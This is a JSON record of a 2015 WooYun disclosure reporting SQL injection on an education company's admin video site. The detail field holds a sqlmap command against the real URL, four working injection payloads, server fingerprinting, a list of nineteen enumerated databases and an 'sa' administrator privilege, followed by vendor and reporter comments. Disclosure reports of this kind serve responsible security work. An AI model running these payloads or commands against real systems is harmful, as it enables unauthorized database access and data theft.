{"id": 31251, "wybug_id": "wooyun-2015-0114499", "wybug_title": "超星尔教育某站SQL注入跨多个数据库泄漏大量数据", "wybug_corp": "erya100.com", "wybug_author": "#6c6c6c", "wybug_date": "2015-05-18 11:33", "wybug_open_date": "2015-07-06 17:48", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-05-22：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-01：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-11：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-21：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-06：\t细节向公众公开  简要描述： 《复仇者联盟2》，讲述了一个过分自信而作死写出了bug程序的土豪程序员连累同事加班补漏洞的故事。又名：《论一个程序员的自我修养》，《雷神是个好产品经理》，《未经内测的产品总会运行出错》，《自己写的bug哭着也要改完》，《不同UI带来的交互差异》。 详细说明：  \nF:\\Python26\\sqlmap>sqlmap.py -u \"http://admin.eryavideo.com/outreachinfopeaker.aspx?type=0&wd=a\" --dbs    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prio consent is illegal. It is the end user's responsibility to obey all applocal, state and federal laws. Developers assume no liability and are nosible for any misuse or damage caused by this program[*] starting at 18:58:44[18:58:44] [WARNING] using 'C:\\Users\\Administrator\\.sqlmap\\output' as th directory[18:58:44] [INFO] resuming back-end DBMS 'microsoft sql server'[18:58:44] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(sts:---Place: GETParameter: wd    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: type=0&wd=a%' AND 7734=7734 AND '%'='    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING    Payload: type=0&wd=a%' AND 3045=CONVERT(INT,(SELECT CHAR(113)+CHAR(1(102)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (3045=3045) THEN CHAR(49) E(48) END))+CHAR(113)+CHAR(121)+CHAR(115)+CHAR(106)+CHAR(113))) AND '%'='    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: type=0&wd=a%'; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: type=0&wd=a%' WAITFOR DELAY '0:0:5'-----[18:58:44] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.5072back-end DBMS: Microsoft SQL Server 2005[18:58:44] [INFO] fetching database names[18:58:44] [INFO] the SQL query used returns 19 entries[18:58:44] [INFO] resumed: 2011erya100[18:58:44] [INFO] resumed: AdminSSreaderVideo[18:58:44] [INFO] resumed: EduErya100[18:58:44] [INFO] resumed: erya100data[18:58:44] [INFO] resumed: EryaVideo[18:58:44] [INFO] resumed: JiJiaoVideo[18:58:44] [INFO] resumed: JXSSreaderVideo[18:58:44] [INFO] resumed: master[18:58:44] [INFO] resumed: model[18:58:44] [INFO] resumed: msdb[18:58:44] [INFO] resumed: SSreaderVideofxhy[18:58:44] [INFO] resumed: ssreadervideosxtlgc[18:58:44] [INFO] resumed: SSVideoCN[18:58:44] [WARNING] cannot properly display Unicode characters inside WS command prompt (http://bugs.python.org/issue1602). All unhandled occurll result in replacement with '?' character. Please, find proper charactsentation inside corresponding output files.[18:58:44] [INFO] resumed: ssvideo????[18:58:44] [INFO] resumed: tempdb[18:58:44] [INFO] resumed: tmp[18:58:44] [INFO] resumed: ZaiFanVideo[18:58:44] [INFO] resumed: ZaiFanVideoNew[18:58:44] [INFO] resumed: zxxvideoavailable databases [19]:[*] 2011erya100[*] AdminSSreaderVideo[*] EduErya100[*] erya100data[*] EryaVideo[*] JiJiaoVideo[*] JXSSreaderVideo[*] master[*] model[*] msdb[*] SSreaderVideofxhy[*] ssreadervideosxtlgc[*] SSVideoCN[*] ssvideo????[*] tempdb[*] tmp[*] ZaiFanVideo[*] ZaiFanVideoNew[*] zxxvideo[18:58:44] [INFO] fetched data logged to text files under 'C:\\Users\\Admir\\.sqlmap\\output\\admin.eryavideo.com'[*] shutting down at 18:58:44\n\ndatabase management system users privileges:[*] sa (administrator)[*] ssvideo_user\n   漏洞证明：     修复方案：  过滤   版权声明：转载请注明来源 #6c6c6c@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：18  确认时间：2015-05-22 17:46 厂商回复： 漏洞并未复现，已私信联系洞主。先行确认。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-05-18 11:55 |    \t\t#6c6c6c \t\t\t( 普通白帽子  |\t\t\t        Rank:291 漏洞数:47        | 像一条狗孤独的活着，渴望的活着，绝望的活...)\t\t \n  @浩天 浩天哥，那么多数据库，不来个前台吗？我看他们的漏洞也有前台的啊。。    \n     2015-05-22 17:36 |    \t\t北京超星尔雅教育科技有限公司 (乌云厂商)\t\t \n  @#6c6c6c 洞主你好，该漏洞并未复现，可否线下指导一下    \n     2015-05-23 16:19 |    \t\t#6c6c6c \t\t\t( 普通白帽子  |\t\t\t        Rank:291 漏洞数:47        | 像一条狗孤独的活着，渴望的活着，绝望的活...)\t\t \n  @北京超星尔雅教育科技有限公司  qq934817794    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 18, "Ranks": null}